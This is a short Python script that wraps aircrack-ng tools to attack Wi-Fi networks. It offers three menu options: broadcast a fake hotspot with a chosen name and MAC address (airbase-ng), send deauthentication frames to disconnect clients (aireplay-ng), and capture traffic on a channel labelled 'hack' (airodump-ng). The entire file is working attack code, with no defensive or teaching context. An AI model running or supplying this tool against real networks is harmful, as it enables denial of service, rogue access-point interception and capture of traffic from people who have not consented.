from subprocess import *

answ = input("->")

if answ == "fake-hot-spot":
    name = input("Enter name of fake wifi hot spot: ")
    mac = input("Enter mac address of fake wifi hot spot: ")
    ch = input("Enter channel number of fake wifi hot spot: ")
    call(["iwconfig"])
    adapter = input("Enter name of your network adapter: ")
    call(["airmon-ng", "start", adapter])
    adapter = adapter + "mon"
    call(["airbase-ng", "-a", mac, "--essid", name, "-c", ch, adapter])

if answ == "deauth":
    call(["iwconfig"])
    adapter = input("Enter name of your network adapter: ")
    call(["airmon-ng", "start", adapter])
    adapter = adapter + "mon"
    mac = input("Enter deauth mac: ")
    call(["aireplay-ng", "-0", "5", "-a", mac, adapter])

if answ == "hack":
    call(["iwconfig"])
    adapter = input("Enter name of your network adapter: ")
    ch = input("Enter channel: ")
    adapter = adapter + "mon"
    call(["airodump-ng", adapter, "--channel", ch, "-w", "cap2"])
